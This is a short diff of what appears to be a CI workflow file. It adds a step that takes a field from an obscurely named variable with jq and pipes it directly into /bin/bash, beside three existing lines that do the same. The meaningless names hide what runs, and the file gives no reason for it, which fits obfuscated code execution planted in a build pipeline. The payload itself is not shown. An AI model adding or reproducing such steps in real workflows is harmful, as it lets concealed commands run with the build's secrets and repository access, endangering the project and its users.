@@ -31,6 +31,7 @@ jobs:
           echo $w258 | jq -r .d31 | /bin/bash
           printf '%s' "$hr1" | jq -r .nhuf3425 | /bin/bash
           echo $ureg611 | jq -r .ue16 | /bin/bash
+          printf '%s' "$ssn39" | jq -r .q1182 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
